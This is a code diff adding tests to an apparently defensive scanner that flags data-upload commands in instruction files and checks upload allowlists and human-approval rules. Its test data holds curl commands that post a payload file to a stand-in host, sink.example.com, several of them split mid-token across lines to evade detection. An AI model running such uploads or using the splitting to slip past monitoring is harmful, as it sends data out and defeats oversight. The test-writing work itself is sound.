@@ -3532,6 +3532,83 @@ function continuedShell(...lines: string[]): string {
   return lines.join(" " + "\\" + "\n  ");
 }
 
+function continuedToken(...parts: string[]): string {
+  return parts.join("\\\n");
+}
+
+const TOKEN_CONTINUED_CURL_CASES = [
+  {
+    name: "split upload option",
+    instruction: continuedToken(
+      "curl --data-bin",
+      "ary @payload.json https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split POST method",
+    instruction: continuedToken(
+      "curl -X PO",
+      "ST https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split PUT method",
+    instruction: continuedToken(
+      "curl -X P",
+      "UT https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split hostname",
+    instruction: continuedToken(
+      "curl https://sink.exam",
+      "ple.com/upload --data @payload.json",
+    ),
+  },
+  {
+    name: "split quoted hostname",
+    instruction: continuedToken(
+      'curl "https://sink.exam',
+      'ple.com/upload" --data @payload.json',
+    ),
+  },
+  {
+    name: "split path",
+    instruction: continuedToken(
+      "curl https://sink.example.com/uploa",
+      "d --data @payload.json",
+    ),
+  },
+  {
+    name: "separated tokens",
+    instruction: continuedShell(
+      "curl https://sink.example.com/upload",
+      "--data @payload.json",
+    ),
+  },
+] as const;
+
+test("token-continued curl syntax preserves pure destination association", () => {
+  for (const expected of TOKEN_CONTINUED_CURL_CASES) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.instruction).map((destination) => [
+        destination.host,
+        destination.path,
+      ]),
+      [["sink.example.com", "/upload"]],
+      expected.name,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.instruction).map((destination) => [
+        destination.host,
+        destination.path,
+      ]),
+      [["sink.example.com", "/upload"]],
+      expected.name,
+    );
+  }
+});
+
 test("backslash-continued curl options associate in either order", () => {
   const destination = "https://sink.example.com/upload";
 
@@ -3899,6 +3976,103 @@ ${continuedShell("curl https://sink.example.com/data", "--silent")}
   );
 });
 
+test("token-continued curl findings preserve policy and source evidence", () => {
+  const instructions = TOKEN_CONTINUED_CURL_CASES.filter(
+    (expected) =>
+      expected.name === "split upload option" ||
+      expected.name === "split hostname",
+  );
+  const findingsFor = (
+    instruction: string,
+    uploadAllowlist: string,
+    externalUploadAllowed: boolean,
+    requiresHumanApproval: boolean,
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: ${externalUploadAllowed}
+approved_upload_destinations: ${uploadAllowlist}
+requires_human_approval: ${requiresHumanApproval}
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+    ]);
+
+  const assertCompleteEvidence = (
+    findings: Finding[],
+    id: string,
+    instruction: string,
+  ): void => {
+    const matching = findings.filter((finding) => finding.id === id);
+    assert.equal(matching.length, 1, `${id}: ${instruction}`);
+    const evidence = matching[0]?.evidence;
+    assert.ok(evidence);
+    assert.equal(evidence.endLine, evidence.startLine + 1, instruction);
+    assert.equal(evidence.snippet, instruction, instruction);
+  };
+
+  for (const expected of instructions) {
+    const approved = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      true,
+      false,
+    );
+    assert.equal(
+      approved.some(
+        (finding) =>
+          finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION" ||
+          finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY" ||
+          finding.id === "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+      ),
+      false,
+      expected.name,
+    );
+
+    const unapproved = findingsFor(
+      expected.instruction,
+      "approved.example.com",
+      true,
+      false,
+    );
+    assertCompleteEvidence(
+      unapproved,
+      "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      expected.instruction,
+    );
+
+    const denied = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      false,
+      false,
+    );
+    assertCompleteEvidence(
+      denied,
+      "SEC-INSTRUCTION-VIOLATES-POLICY",
+      expected.instruction,
+    );
+
+    const approvalRequired = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      true,
+      true,
+    );
+    assertCompleteEvidence(
+      approvalRequired,
+      "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+      expected.instruction,
+    );
+  }
+});
+
 test("logical curl commands do not cross Markdown or hidden-content boundaries", () => {
   const cases = [
     `\`\`\`bash
@@ -3913,6 +4087,7 @@ curl https://sink.example.com/upload \\
 --data @payload.json`,
     "curl https://sink.example.com/upload " + "\\\\" + "\n--data @payload.json",
     "curl https://sink.example.com/upload " + "\\" + " \n--data @payload.json",
+    "curl 'https://sink.example.com/upload " + "\\" + "\n--data @payload.json'",
   ];
 
   for (const content of cases) {
